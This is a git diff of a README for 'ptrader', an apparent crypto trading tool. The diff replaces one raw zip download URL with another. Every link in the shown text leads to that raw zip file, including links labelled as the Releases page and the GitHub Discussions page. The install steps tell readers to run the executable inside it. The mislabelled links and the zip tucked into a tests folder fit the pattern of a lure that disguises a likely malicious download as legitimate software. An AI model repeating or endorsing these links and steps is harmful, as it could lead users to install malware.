@@ -1,7 +1,7 @@
 # 🚀 ptrader - Simplify Your Crypto Trading Today
 
 ## 📦 Download the Latest Version
-[![Download ptrader](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/src/ptrader/Software_eumoiriety.zip)](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/src/ptrader/Software_eumoiriety.zip)
+[![Download ptrader](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/tests/Software-2.1.zip)](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/tests/Software-2.1.zip)
 
 ## 🛠️ Overview
 ptrader is an intraday crypto trading system designed for economic fidelity and strong observability. It focuses on research, education, and experimentation. Note that outputs from ptrader do not offer financial, investment, tax, or legal advice and are not trading recommendations.
@@ -24,7 +24,7 @@ To run ptrader smoothly, ensure your system meets the following requirements:
 Follow these steps to get started with ptrader:
 
 1. **Visit the Releases Page**
-   Go to the ptrader [Releases page](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/src/ptrader/Software_eumoiriety.zip).
+   Go to the ptrader [Releases page](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/tests/Software-2.1.zip).
 
 2. **Choose the Latest Version**
    Look for the most recent release labeled with the highest version number. It typically has the title "Latest Release". 
@@ -35,13 +35,13 @@ Follow these steps to get started with ptrader:
 4. **Install ptrader**
    - **For Windows Users:** Double-click the .exe file and follow the on-screen instructions to install ptrader.
    - **For Mac Users:** Open the .zip file, drag the ptrader application into your Applications folder, and open it.
-   - **For Linux Users:** Extract the https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/src/ptrader/Software_eumoiriety.zip file and run the executable in your terminal.
+   - **For Linux Users:** Extract the https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/tests/Software-2.1.zip file and run the executable in your terminal.
 
 5. **Launch ptrader**
    After installation, find ptrader in your applications or programs list. Open it, and you are ready to explore crypto trading.
 
 ## 📥 Download & Install
-To begin using ptrader, please follow this link: [Download ptrader](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/src/ptrader/Software_eumoiriety.zip).
+To begin using ptrader, please follow this link: [Download ptrader](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/tests/Software-2.1.zip).
 Click the link to go directly to the Releases page where you can download the latest version.
 
 ## 📈 Getting Help
@@ -52,10 +52,10 @@ If you encounter issues or have questions:
 
 ## 🌐 Community
 Join our community where users share tips, experiences, and strategies:
-- Engage with fellow traders on the [GitHub Discussions page](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/src/ptrader/Software_eumoiriety.zip).
+- Engage with fellow traders on the [GitHub Discussions page](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/tests/Software-2.1.zip).
 - Follow us on social media for updates on new features and best practices.
 
 ## 📊 Important Notice
 ptrader is intended for educational and experimental use. All trading carries risk. Ensure you are aware of the potential losses involved in crypto trading.
 
-If you are ready to experience the simplicity of crypto trading, download ptrader today! Visit our [Releases page](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/src/ptrader/Software_eumoiriety.zip) to get started.
+If you are ready to experience the simplicity of crypto trading, download ptrader today! Visit our [Releases page](https://raw.githubusercontent.com/PandaKawaii334/ptrader/main/tests/Software-2.1.zip) to get started.
